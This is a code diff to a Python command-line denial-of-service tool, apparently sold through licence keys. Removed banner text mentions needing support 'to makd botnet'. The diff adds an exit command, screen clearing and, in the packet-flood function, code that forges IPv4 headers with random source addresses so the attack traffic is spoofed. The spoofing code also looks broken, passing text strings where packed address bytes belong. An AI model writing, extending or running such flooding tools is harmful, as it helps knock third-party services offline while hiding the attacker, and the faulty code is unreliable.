@@ -10,6 +10,7 @@ import re
 import importlib
 import string
 import platform
+import struct
 
 # ANSI escape codes for colors
 GREEN = '\033[92m'
@@ -37,6 +38,8 @@ er2random_message = random.choice(er2messages)
 
 er1random_message = random.choice(er1messages)
 
+os.system('cls' if os.name == 'nt' else 'clear')
+
 try:
     from licensing.models import *
     from licensing.methods import Key, Helpers
@@ -53,8 +56,7 @@ auth = "WyI0MTg5MjUyNSIsImh0UkFVYXppQUpEMHBSMThDTzljdDdlcHBveGczbXVveVR5OTdSY2wi
 result = Key.activate(token=auth,\
 	                  rsa_pub_key=RSAPubKey,\
 	                  product_id=19375,\
-	                  key= input( GREEN +"""Welcome, You can get key from admin. 
-Each keys will expire after every single days. You can get by watch 3 ads to support us. Cause we need support to makd botnet.
+	                  key= input( GREEN +"""Welcome, User 
 """ + RED + """
 |Put Activation Key: """),\
 	                  machine_code=Helpers.GetMachineCode(v=2))
@@ -104,11 +106,13 @@ print(RED + """
 srt dos - start the operation of dos.
 ping - ping to the server.
 help - tutorial
+exit - close 
 """ + RED +"""___________________________________________________
  """ + RESET)
 
 time.sleep(8)
 
+os.system('cls' if os.name == 'nt' else 'clear')
 print( RED + """
  █     █░▓█████  ██▓    ▄████▄  ▒█████   ███▄ ▄███▓▓█████  ▐██▌ 
 ▓█░ █ ░█░▓█   ▀ ▓██▒   ▒██▀ ▀█ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█   ▀  ▐██▌ 
@@ -199,6 +203,9 @@ elif prompt == "chk sys":
 
     for key, value in system_info.items():
         print(f'{key}: {value}')
+
+elif prompt == "exit":
+    sys.exit()
 
 elif prompt == "chk ver":
     import importlib
@@ -510,7 +517,12 @@ def send_packets():
                 if attack_type == "TCP":
                     sock.send(data)
                 else:
-                    sock.sendto(data, (target, port))
+                    # add IP spoofing
+                    source_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+                    dest_ip = target
+                    packet = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 28+len(data), start_time_ms & 0xffff, 0, 64, 17, 0, source_ip, dest_ip)
+                    packet += data
+                    sock.sendto(packet, (dest_ip, port))
         except:
             pass
         packet_count += 1
